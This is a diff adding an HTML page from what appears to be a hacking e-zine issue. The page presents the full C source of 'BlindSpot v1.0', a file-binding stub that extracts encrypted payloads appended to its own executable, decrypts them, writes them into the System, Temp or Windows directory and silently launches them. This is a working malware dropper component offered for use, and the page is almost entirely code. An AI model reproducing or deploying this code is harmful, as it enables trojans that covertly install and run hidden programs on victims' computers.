@@ -1,0 +1,111 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: s134k || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/s134k/BlindSpot"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+/*
+			BlindSpot v1.0
+			- Small multiple file binding stub.
+
+			Coded by: s134k
+*/
+
+#pragma optimize(&quot;gsy&quot;, on)
+#pragma comment(linker, &quot;/ENTRY:Entry&quot;)
+#pragma comment(linker, &quot;/FILEALIGN:0x200&quot;)
+#pragma comment(linker, &quot;/MERGE:.rdata=.data&quot;)
+#pragma comment(linker, &quot;/MERGE:.text=.data&quot;)
+#pragma comment(linker, &quot;/MERGE:.reloc=.data&quot;)
+#pragma comment(linker, &quot;/SECTION:.text, EWR /IGNORE:4078&quot;)
+
+#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;shellapi.h&gt;
+
+#define WIN32_LEAN_AND_MEAN
+#define STUB_EOF 2048
+
+struct file_data {
+	char name[40];
+	unsigned long size;
+	int key;
+	short path;
+	short run;
+} *pfile_data;
+
+void DecryptRecord(char *szRec, unsigned long nLen, char *szKey)
+{
+	unsigned long i;
+	char *p;
+
+	p = szKey;
+
+	for(i = 0; i &lt; nLen; i++) {
+		if(!(*p))
+			p = szKey;
+
+		*szRec -= *p;
+		*szRec++ ^= *p++;
+	}
+}
+
+int Entry(void)
+{
+	HANDLE hStub, hFile;
+	DWORD dwBytesRead, dwBytesWritten;
+	char szThisFile[_MAX_FNAME], szPath[MAX_PATH], szKey[5], *buf = &quot;&quot;;
+	struct file_data fd;
+
+	pfile_data = &amp;fd;
+
+	GetModuleFileName(NULL, szThisFile, _MAX_FNAME);
+
+	hStub = CreateFile(szThisFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	SetFilePointer(hStub, STUB_EOF, NULL, FILE_BEGIN);
+
+	while(ReadFile(hStub, pfile_data, sizeof fd, &amp;dwBytesRead, NULL) &amp;&amp; dwBytesRead) {
+		if(pfile_data-&gt;path == 1)
+			GetSystemDirectory(szPath, sizeof szPath);
+		else if(pfile_data-&gt;path == 2)
+			GetTempPath(sizeof szPath, szPath);
+		else
+			GetWindowsDirectory(szPath, sizeof szPath);
+
+		lstrcat(szPath, &quot;\\&quot;);
+		lstrcat(szPath, pfile_data-&gt;name);
+
+		hFile = CreateFile(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if(hFile == INVALID_HANDLE_VALUE)
+			return 1;
+
+		wsprintf(szKey, &quot;%d&quot;, pfile_data-&gt;key);
+
+		buf = malloc(pfile_data-&gt;size);
+		if(!buf)
+			return 2;
+
+		ReadFile(hStub, buf, pfile_data-&gt;size, &amp;dwBytesRead, NULL);
+		DecryptRecord(buf, dwBytesRead, szKey);
+		WriteFile(hFile, buf, dwBytesRead, &amp;dwBytesWritten, NULL);
+		if(dwBytesWritten != dwBytesRead) {
+			free(buf);
+			CloseHandle(hStub);
+			CloseHandle(hFile);
+
+			return 3;
+		}
+
+		CloseHandle(hFile);
+		free(buf);
+
+		if(pfile_data-&gt;run)
+			ShellExecute(NULL, &quot;open&quot;, szPath, NULL, NULL, SW_SHOWNORMAL);
+	}
+	
+	CloseHandle(hStub);
+
+	return 0;
+}
+</pre></body></html>
